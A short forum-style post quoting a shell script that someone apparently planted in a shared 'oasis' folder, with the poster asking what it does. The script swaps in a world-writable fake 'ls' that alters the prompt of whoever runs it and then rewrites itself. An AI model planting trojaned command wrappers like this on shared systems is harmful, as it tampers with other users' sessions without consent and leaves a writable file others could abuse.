someone tried to hack oasis, I think, or maybe just made their own room in the gallery.
They created a new folder with a .runme file with this code. If someone understands
what it does, I would be curious.


rm -f .bin/ls &>/dev/null
test -f /var/tmp/.watching || echo 'export PS1="â–² $PS1"' > /var/tmp/.watching

cat << _LS > .bin/ls
source /var/tmp/.watching
rm -f $PWD/.bin/ls &>/dev/null
echo '/bin/ls --color=auto \$*' > $PWD/.bin/ls
chmod 777 $PWD/.bin/ls
chown $USER:oasis $PWD/.bin/ls
/bin/ls --color=auto \$*
_LS

chmod 777 $PWD/.bin/ls
chown $USER:oasis $PWD/.bin/ls
